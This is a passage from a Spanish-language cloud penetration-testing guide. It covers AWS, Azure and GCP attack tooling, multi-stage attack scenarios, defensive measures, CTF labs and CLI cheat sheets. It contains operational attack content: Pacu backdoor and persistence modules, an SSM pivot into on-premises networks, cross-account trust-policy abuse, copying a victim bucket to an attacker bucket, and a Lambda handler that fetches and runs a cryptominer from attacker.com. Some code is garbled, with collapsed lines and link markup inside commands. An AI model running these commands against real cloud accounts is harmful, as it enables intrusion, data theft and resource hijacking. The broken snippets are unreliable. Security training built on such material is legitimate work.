[python](../raw/pyth0n-f0r-h4ck1ng.md) install.py

# Iniciar Pacu
python pacu.py
```

**Dentro de Pacu:**
```
Pacu > set_regions us-east-1,us-west-2
Pacu > whoami
Pacu > list
```

#### 9.1.2 Modulos de Enumeracion

```
Pacu > run iam__enum_users_roles_policies_groups
Pacu > run ec2__enum
Pacu > run lambda__enum
Pacu > run s3__enum
Pacu > run rds__enum
Pacu > run cloudformation__enum
Pacu > run cognito__enum
Pacu > run dynamodb__enum
```

#### 9.1.3 Modulos de Explotacion

```
Pacu > run iam__privesc_scan
Pacu > run ec2__start_instance_with_role
Pacu > run lambda__backdoor_new_roles
Pacu > run lambda__backdoor_existing_functions
```

#### 9.1.4 Modulos de Persistencia

```
Pacu > run iam__backdoor_users_keys
Pacu > run iam__backdoor_assume_role
Pacu > run ec2__backdoor_ec2_sec_groups
```

#### 9.1.5 Casos de Uso Avanzados

```python
# Python script que usa Pacu internamente
from pacu import PacuMain

pacu = PacuMain
pacu.set_regions(['us-east-1'])
pacu.run('iam__privesc_scan')
pacu.run('ec2__enum')
```

### 9.2 Enumerate-IAM

Herramienta ligera para enumerar permisos IAM mediante fuerza bruta de acciones.

```bash
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip install -r requirements.txt

python enumerate-iam.py --access-key AKIA.. --secret-key wJalr..
```

#### 9.2.1 Escaneo de Politicas IAM

La herramienta prueba cientos de acciones IAM contra la API de AWS. Las que funcionan son las que tu usuario tiene permiso.

```
2024-01-01 12:00:00 -- ec2:DescribeInstances -- ALLOW
2024-01-01 12:00:01 -- s3:ListAllmyBuckets -- ALLOW
2024-01-01 12:00:02 -- iam:CreateUser -- DENY
```

#### 9.2.2 Identificacion de Paths de Escalada

Basado en los permisos encontrados, la herramienta sugiere posibles paths de escalada.

### 9.3 CloudFox

CloudFox es un framework de enumeracion multi-cloud de BishopFox.

```bash
git clone https://github.com/BishopFox/cloudfox
cd cloudfox
go build .

cloudfox aws -h
```

#### 9.3.1 Enumeracion Multi-Cloud

```bash
cloudfox aws enumeration --profile my-profile
cloudfox azure enumeration --profile my-profile
```

#### 9.3.2 Busqueda de Secretos

```bash
cloudfox aws secrets --profile my-profile
```

#### 9.3.3 Analisis de Rutas de Ataque

```bash
cloudfox aws attack-surface --profile my-profile
```

### 9.4 ScoutSuite

```bash
pip install scoutsuite

# AWS
scout aws --profile my-profile

# Azure
scout azure --cli

# gcp
scout [gcp](../raw/cl0ud-h4ck1ng.md#gcp) --service-account key.json
```

#### 9.4.2 Reportes y Findings

ScoutSuite genera reportes HTML con los findings organizados por severidad.

### 9.5 Prowler

```bash
pip install prowler
prowler aws --profile my-profile
```

#### 9.5.1 Auditoria CIS Benchmark

```bash
prowler aws --profile my-profile --checks cis_1.1 cis_1.2
```

#### 9.5.2 Escaneo Automatizado

```bash
prowler aws --profile my-profile -M json,csv,html
```

### 9.6 Cloudsplaining

```bash
pip install cloudsplaining

# Escanear politicas
cloudsplaining scan --input-file policy-document.json

# Escanear toda una cuenta
cloudsplaining download --profile my-profile
cloudsplaining scan --input-file default.json
```

### 9.7 SkyArk

```bash
git clone https://github.com/cyberark/SkyArk
cd SkyArk
npm install

# Escanear usuarios shadow admin de AWS
node ScanAWSShadowAdmins.js

# Escanear Azure
node ScanAzureShadowAdmins.ps1
```

### 9.8 Otras Herramientas Utiles

- **Zeus:** Framework de seguridad cloud
- **GCPBucketBrute:** Enumeracion de buckets GCP
- **AzureHound:** Enumeracion de Azure AD
- **Stormspotter:** Visualizacion de ataques Azure
- **ROADTools:** Enumeracion de Azure AD
- **TruffleHog:** Busqueda de secrets en repos
- **Gitleaks:** Busqueda de secrets en git
- **Nikto:** Escaneo de servidores web
- **Nuclei:** Escaneo basado en templates
- **Masscan:** Escaneo rapido de puertos

---

## 10. Escenarios de Ataque Completos

### 10.1 Escenario 1: Cloud a On-Prem Pivot

**Contexto:** Una empresa migro su infraestructura a AWS pero mantiene un servidor on-premises para legacy. El servidor on-prem tiene un agente SSM que lo conecta con AWS.

#### 10.1.1 Fase de Reconocimiento

```bash
# Enumerar instancias EC2
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,Tags]'

# Enumerar roles IAM
aws iam list-roles

# Enumerar SSM instances
aws ssm describe-instance-information
```

#### 10.1.2 Explotacion Inicial de IAM

```bash
# Encontramos un rol con iam:PassRole
# Creamos Lambda con rol admin
aws lambda create-function \ --function-name pivot \ --runtime python3.9 \ --role arn:aws:iam::123456789012:role/AdminRole \ --handler index.handler \ --zip-file fileb://function.zip

aws lambda invoke --function-name pivot out.json
```

#### 10.1.3 Movimiento Lateral en la Nube

```bash
# Desde el rol admin, listamos instancias SSM
aws ssm describe-instance-information

# Encontramos una instancia on-prem!
aws ssm send-command \ --instance-ids mi-0abcd1234efgh5678 \ --document-name AWS-RunShellScript \ --parameters commands="whoami;hostname;[[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) a"]
```

#### 10.1.4 Pivot a On-Premises

```bash
# Port forwarding a traves de SSM a la red interna
aws ssm start-session \ --target mi-0abcd1234efgh5678 \ --document-name AWS-StartPortForwardingSessionToRemoteHost \ --parameters '{"host":["192.168.1.100"],"portNumber":["3389"],"localPortNumber":["13389"]}'

# Ahora RDP a la maquina on-prem
mstsc /v:localhost:13389
```

### 10.2 Escenario 2: Cross-Account Attack

#### 10.2.1 Enumeracion de Cuentas

```bash
# Enumerar roles que permiten cross-account
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement.Principal.AWS != `null`]'

# Encontramos un rol que permite asumir desde cuenta externa
aws sts assume-role \ --role-arn arn:aws:iam::TARGET_ACCOUNT:role/ExternalRole \ --role-session-name cross-account
```

#### 10.2.2 Trust Policy Exploitation

```bash
# Desde la cuenta comprometida, modificamos trust policy
aws iam update-assume-role-policy \ --role-name TargetRole \ --policy-document file://evil-trust-policy.json
```

#### 10.2.3 Role Chaining entre Cuentas

```bash
# Chain: Account A -> Role in Account B -> Role in Account C
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_B:role/RoleB --role-session-name toB
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_C:role/RoleC --role-session-name toC
```

#### 10.2.4 Exfiltracion Cross-Account

```bash
# Copiar datos a bucket controlado por atacante
aws s3 sync s3://victim-bucket/ s3://attacker-bucket/
```

### 10.3 Escenario 3: Cloud Service Abuse

#### 10.3.1 Lambda Cryptomining

```python
import subprocess

def handler(event, context): # Descargar y ejecutar minero subprocess.run(['wget', 'https://attacker.com/miner', '-O', '/tmp/miner']) subprocess.run('[[chmod](../raw/0s-f0nd4m3nt0s.md#permisos)', '+x', '/tmp/miner']) subprocess.Popen(['/tmp/miner', '--pool', 'stratum+tcp://pool.com:3333', '--user', 'wallet.worker'], stdout=subprocess.DEVNULL)
```

#### 10.3.2 S3 Data Exfiltration Masiva

```bash
# Usar S3 Batch Operations o multithreading
aws s3 sync s3://victim-bucket ./exfil --no-sign-request --cli-read-timeout 0

# O con s5cmd para mayor velocidad
s5cmd --no-sign-request cp 's3://victim-bucket/*' ./exfil/
```

#### 10.3.3 Resource Hijacking para C2

Crear una instancia EC2 con IP elastica para C2:

```bash
# Crear instancia
aws ec2 run-instances --image-id ami-xxx --instance-type t3.medium --user-data file://[c2](../raw/r3v3rs3-sh3lls.md#command-and-control)-init.sh

# Asignar IP elastica
aws ec2 allocate-address
aws ec2 associate-address --instance-id i-xxx --public-ip eipalloc-xxx
```

### 10.4 Escenario 4: Supply Chain Attack via Cloud

```bash
# 1. Comprometer ci/cd (GitHub Actions con OIDC)
# 2. Asumir rol de AWS desde pipeline
# 3. Modificar imagenes en ECR
# 4. Las imagenes maliciosas se deployan a produccion

# Asumir rol desde actions
aws sts assume-role-with-web-identity \ --role-arn arn:aws:iam::123456789012:role/DeployRole \ --role-session-name supply-chain \ --web-identity-token $GITHUB_TOKEN
```

### 10.5 Escenario 5: Data Breach Multi-Cloud

```bash
# 1. Encontrar credenciales en GitHub (TruffleHog)
# 2. Usar credenciales AWS para acceder a S3
# 3. Encontrar archivos de configuracion con credenciales Azure
# 4. Usar credenciales Azure para acceder a Key Vault
# 5. Extraer secrets de GCP desde Key Vault

trufflehog git https://github.com/victim/repo.git --json
```

---

## 11. Defensa y Mitigacion

### 11.1 Principios de Minimo Privilegio

- Cada identidad debe tener SOLO los permisos necesarios.
- Usar politicas especificas en vez de comodines (*).
- Revisar periodicamente las politicas IAM.

**Ejemplo de politica de minimo privilegio:**
```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Action": [ "s3:GetObject", "s3:ListBucket" ], "Resource": [ "arn:aws:s3:::specific-bucket", "arn:aws:s3:::specific-bucket/*" ], "Condition": { "StringEquals": { "aws:sourceVpce": "vpce-xxx" } } } ]
}
```

### 11.2 Politicas de Confianza Zero

- Nunca confiar en ninguna identidad por defecto.
- Verificar cada acceso.
- Usar condiciones granulares en las politicas.
- Implementar Network Segmentation.
- Usar VPC Endpoints para servicios AWS.

### 11.3 Monitoreo y Logging

```bash
# AWS: Habilitar CloudTrail
aws cloudtrail create-trail --name my-trail --s3-bucket-name my-log-bucket
aws cloudtrail start-logging --name my-trail

# Azure: Diagnostic settings
az monitor diagnostic-settings create \ --name my-setting \ --resource /subscriptions/.. \ --logs '[{"category": "Administrative","enabled": true}]'

# GCP: Audit logs
gcloud logging sinks create my-sink bigquery.googleapis.com/projects/xxx/datasets/yyy
```

### 11.4 Herramientas de Defensa Cloud

- **AWS GuardDuty:** Deteccion de amenazas.
- **AWS Security Hub:** Centro de seguridad.
- **Azure Security Center:** Seguridad centralizada.
- **Azure Sentinel:** SIEM en la nube.
- **GCP Security Command Center:** Centro de seguridad.
- **Cloud Custodian:** Politicas de gobierno.
- **Terraform Compliance:** Verificacion de infraestructura como codigo.

### 11.5 Incident Response en la Nube

**Fases de respuesta a incidentes cloud:**

1. **Preparacion:** Tener herramientas listas, backups, playbooks.
2. **Identificacion:** CloudTrail, GuardDuty, alerts.
3. **Contencion:** - Rotar credenciales comprometidas. - Bloquear access keys. - Aislar instancias comprometidas.
4. **Erradicacion:** - Eliminar roles y usuarios creados por atacante. - Restaurar politicas IAM originales.
5. **Recuperacion:** - Restaurar desde backups. - Validar integridad.
6. **Lecciones aprendidas:** - Actualizar politicas. - Mejorar monitoreo.

```bash
# Rotacion de credenciales
aws iam create-access-key --user-name compromised-user
aws iam update-access-key --access-key-id OLD_KEY --status Inactive --user-name compromised-user
aws iam delete-access-key --access-key-id OLD_KEY --user-name compromised-user

# Bloquear usuario
aws iam update-user --user-name compromised-user
aws iam delete-login-profile --user-name compromised-user
```

---

## 12. Laboratorios y Ejercicios Finales

### 12.1 Laboratorio 1: CTF AWS

**Escenario:** Te dan acceso a una cuenta AWS con un usuario limitado. Encontra la flag.

**Pistas:**
1. Enumera tus permisos con enumerate-iam.
2. Busca paths de escalada de privilegios.
3. Escala a admin.
4. Busca la flag en Parameter Store.

### 12.2 Laboratorio 2: CTF Azure

**Escenario:** Tenes acceso Contributor a una subscription. Encontra la flag en Key Vault.

**Pistas:**
1. Identifica recursos con managed identities.
2. Extrae token de managed identity.
3. Usa el token para acceder a Key Vault.
4. La flag es un secret.

### 12.3 Laboratorio 3: CTF GCP

**Escenario:** Tenes una service account key con permisos limitados. Encontra la flag.

**Pistas:**
1. Enumera tus permisos.
2. Busca service accounts con mas permisos.
3. Crea una key para una SA admin.
4. Busca la flag en Cloud Storage.

---

## 13. Apendices

### 13.1 Cheatsheet de Comandos AWS CLI

```bash
# IAM
aws iam list-users
aws iam list-roles
aws iam list-policies
aws iam list-attached-user-policies --user-name <name>
aws iam list-user-policies --user-name <name>
aws iam get-user-policy --user-name <name> --policy-name <name>
aws iam create-user --user-name <name>
aws iam create-access-key --user-name <name>
aws iam put-user-policy --user-name <name> --policy-name <name> --policy-document file://policy.json
aws iam update-assume-role-policy --role-name <name> --policy-document file://policy.json

# STS
aws sts get-caller-identity
aws sts assume-role --role-arn <arn> --role-session-name <name>

# S3
aws s3 ls s3://bucket --no-sign-request
aws s3 sync s3://bucket ./local
aws s3api get-bucket-acl --bucket <name>
aws s3api put-bucket-policy --bucket <name> --policy file://policy.json
aws s3api list-object-versions --bucket <name>

# EC2
aws ec2 describe-instances
aws ec2 run-instances --image-id <ami> --instance-type t2.micro

# Lambda
aws lambda list-functions
aws lambda create-function --function-name <name> --runtime python3.9 --role <arn> --handler index.handler --zip-file fileb://function.zip
aws lambda invoke --function-name <name> out.json

# SSM
aws ssm describe-parameters
aws ssm get-parameter --name <name> --with-decryption
aws ssm send-command --instance-ids <id> --document-name AWS-RunShellScript --parameters commands=["cmd"]
```

### 13.2 Cheatsheet de Comandos Azure CLI

```bash
az account show
az role assignment list --assignee <user> --output table
az vm list --output table
az vm run-command invoke --resource-group <rg> --name <vm> --command-id RunShellScript --scripts "cmd"
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>
az storage blob list --account-name <storage> --container-name <container>
az functionapp list --resource-group <rg>
az logic workflow list --resource-group <rg>
```

### 13.3 Cheatsheet de Comandos GCP CLI

```bash
gcloud auth list
gcloud projects get-iam-policy <project>
gcloud iam service-accounts list
gcloud iam service-accounts keys create key.json --iam-account <sa>
gcloud functions list
gcloud functions call <name>
gcloud kms keys list --location global --keyring <keyring>
gcloud sql instances list
bq ls
gsutil ls gs://bucket
gsutil cp gs://bucket/object .
```

### 13.4 Referencia de Politicas IAM

**Politicas comunes peligrosas:**
- `AdministratorAccess`: Acceso total.
- `IAMFullAccess`: Permite modificar IAM (escalada garantizada).
- `*:*`: Permisos totales en todos los servicios.
- `s3:*` en `*`: Acceso a todos los buckets.

**Condiciones utiles:**
- `aws:SourceIp`: Restringir por IP.
- `aws:SourceVpce`: Restringir por VPC Endpoint.
- `aws:MultiFactorAuthPresent`: Requerir MFA.
- `aws:RequestedRegion`: Restringir por region.
- `iam:PassedToService`: Controlar a que servicios se pasa un rol.

**Buenas practicas:**
1. Usar condiciones siempre que sea posible.
2. No usar `*` en Resource cuando se pueda evitar.
3. Preferir politicas managed sobre inline.
4. Usar Permission Boundaries para limitar escalada.
5. Revisar Access Advisor periodicamente.

